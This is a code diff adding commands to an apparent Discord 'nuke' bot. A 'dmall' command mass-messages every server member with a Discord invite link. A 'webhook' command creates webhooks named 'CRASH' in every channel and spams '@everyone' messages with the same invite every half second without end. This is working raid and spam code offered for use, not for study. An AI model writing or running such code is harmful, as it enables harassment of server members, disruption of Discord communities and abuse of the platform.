@@ -92,6 +92,37 @@ async def nuke(ctx):
             i += 1
         await asyncio.gather(*tasks, return_exceptions=True)
 
+@bot.command()
+async def dmall(ctx, *, message):
+    guild = ctx.guild
+    for member in guild.members:
+        if not member.bot:
+            try:
+                await member.send(f"{message}\n\nhttps://discord.gg/W9fRBPUGbV")
+            except:
+                pass
+    await ctx.send("Рассылка завершена", delete_after=1)
+
+@bot.command()
+async def webhook(ctx, *, message):
+    guild = ctx.guild
+    for channel in guild.text_channels:
+        try:
+            wh = await channel.create_webhook(name="CRASH")
+            asyncio.create_task(spam_webhook(wh, message))
+        except:
+            pass
+    await ctx.send("Вебхуки созданы", delete_after=1)
+
+async def spam_webhook(wh, message):
+    while True:
+        try:
+            await wh.send(f"@everyone {message}\n\nhttps://discord.gg/W9fRBPUGbV",
+                          username="CRASHED", avatar_url=None)
+        except:
+            break
+        await asyncio.sleep(0.5)
+
 import os
 
 keep_alive()
